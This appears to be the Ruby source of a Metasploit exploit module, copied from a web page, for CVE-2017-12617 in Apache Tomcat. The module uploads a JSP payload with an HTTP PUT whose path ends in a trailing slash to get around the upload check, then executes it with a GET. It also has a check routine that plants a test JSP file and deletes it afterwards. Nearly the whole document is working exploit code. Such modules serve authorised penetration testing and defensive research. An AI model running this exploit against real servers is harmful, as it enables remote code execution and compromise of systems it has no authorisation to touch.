# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Tomcat RCE via JSP Upload Bypass&#039;,
      &#039;Description&#039;    => %q{
        This module uploads a jsp payload and executes it.
      },
      &#039;Author&#039;      => &#039;peewpw&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2017-12617&#039; ],
          [ &#039;URL&#039;, &#039;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617&#039; ],
          [ &#039;URL&#039;, &#039;https://bz.apache.org/bugzilla/show_bug.cgi?id=61542&#039; ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;    => %w{ linux win }, # others?
      &#039;Targets&#039;     =>
        [
          [ &#039;Automatic&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Java Windows&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [ &#039;Java Linux&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;linux&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 03 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([
        OptString.new(&#039;TARGETURI&#039;, [true, "The URI path of the Tomcat installation", "/"]),
        Opt::RPORT(8080)
      ])
  end

  def check
    testurl = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, "#{testurl}.jsp/"),
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;data&#039;      => "<% out.println(\"#{testcontent}\");%>"
    })

    res1 = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, "#{testurl}.jsp"),
      &#039;method&#039;    => &#039;GET&#039;
    })

    if res1 && res1.body.include?(testcontent)
      send_request_cgi(
        opts = {
          &#039;uri&#039;       => normalize_uri(target_uri.path, "#{testurl}.jsp/"),
          &#039;method&#039;    => &#039;DELETE&#039;
        },
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Uploading payload...")
    testurl = Rex::Text::rand_text_alpha(10)

    res = send_request_cgi({
      &#039;uri&#039;       => normalize_uri(target_uri.path, "#{testurl}.jsp/"),
      &#039;method&#039;    => &#039;PUT&#039;,
      &#039;data&#039;      => payload.encoded
    })
    if res && res.code == 201
      res1 = send_request_cgi({
        &#039;uri&#039;       => normalize_uri(target_uri.path, "#{testurl}.jsp"),
        &#039;method&#039;    => &#039;GET&#039;
      })
      if res1 && res1.code == 200
        print_status("Payload executed!")
      else
        fail_with(Failure::PayloadFailed, "Failed to execute the payload")
      end
    else
      fail_with(Failure::UnexpectedReply, "Failed to upload the payload")
    end
  end

end

